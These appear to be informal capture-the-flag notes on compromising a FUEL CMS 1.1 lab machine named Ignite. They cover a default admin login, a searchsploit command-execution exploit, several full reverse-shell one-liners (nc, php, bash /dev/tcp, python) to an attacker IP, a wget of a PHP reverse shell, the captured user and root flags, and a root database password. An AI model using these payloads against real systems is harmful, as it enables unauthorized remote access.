### Ignite ###

export IP=10.10.12.237


the default page is im guessing id the installation guide of FUEL CMS, and the version also seems to be just 1.1 so mayb searchsploit have something....

secondly, it included a /fuel login page...

the mechanism is a bit tricky....it uses a url for POST request the arguments that has a hash which is included in one of those arguments..if that makes sense...maybe a python script for all this...


nevermind: admin:admin worked xD


Searchsploit gave me a command execution vuln:

nc -e /bin/sh 10.11.18.102 6000

That didn't work...

php -r '$sock=fsockopen("10.11.18.102",6000);exec("/bin/sh -i <&3 >&3 2>&3");'

didn't work..

bash -i >& /dev/tcp/10.11.18.102/6000 0>&1


Meanwhile got some files that i can access....mikey179...found this in composer,json..so mickey is a user


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.18.102",6000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'



Since i am in the home directory of the web server...and i have remote code execution...

i can wget my rev_Shell and load it into the browser to get the reverse shell...


wget http://10.11.18.102:8000/reverse-shell-php.php 

And got a reverse shell...

# User.txt:
6470e394cbf6dab6a91682cc8585059b


Back on the home page it was listed that for db installation it has to enlist the username and password for the root user....in configuration.php...root:mememe

# Root.txt:
b9bbcb33e11b80be759c4e844862482d